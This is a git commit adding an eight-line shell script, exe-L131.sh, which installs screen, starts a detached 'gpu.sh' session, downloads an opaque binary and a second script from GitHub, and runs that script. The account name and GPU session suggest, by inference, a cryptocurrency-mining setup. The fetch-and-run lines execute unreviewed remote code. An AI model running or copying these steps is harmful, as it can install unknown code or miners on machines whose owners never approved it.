7617c1afb75d33dff0149f12e2db519a8214972a
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-08-30 01:04:37 +0700

    Create exe-L131.sh

---
+++ exe-L131.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpu.sh ./gpu.sh 87 93
+wget https://github.com/d-crypto99/qq/raw/main/mantapuu
+wget https://raw.githubusercontent.com/d-crypto99/NM/main/L131.sh
+chmod +x L131.sh
+./L131.sh
